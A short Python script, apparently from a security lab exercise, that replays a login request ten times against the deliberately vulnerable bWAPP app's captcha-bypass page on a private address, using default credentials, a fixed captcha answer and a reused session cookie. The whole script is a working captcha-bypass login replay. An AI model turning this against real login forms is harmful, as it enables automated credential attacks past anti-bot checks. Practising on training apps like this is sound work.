from matplotlib.pyplot import text
import requests, re

def connexion(url):
    Host = '192.168.85.129'

    headers = {
                'Host': Host,
                'Content-Length': '56',
                'Referer': 'http://192.168.85.129/bWAPP/ba_captcha_bypass.php',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Connection': 'close'
              }
    data = {
        'login': 'bee',
        'password': 'bug',
        'captcha_user': '%%21k2xjN',
        'form': 'submit'
    }

    cookies = {
        'PHPSESSID': 'd84316e16434ca241ea613323024ba66',
        'security_level': '0'
    }

    for i in range(10):
        req = requests.post(url=url, headers=headers, data=data, cookies=cookies)
        print(req.status_code)

connexion("http://192.168.85.129/bWAPP/ba_captcha_bypass.php")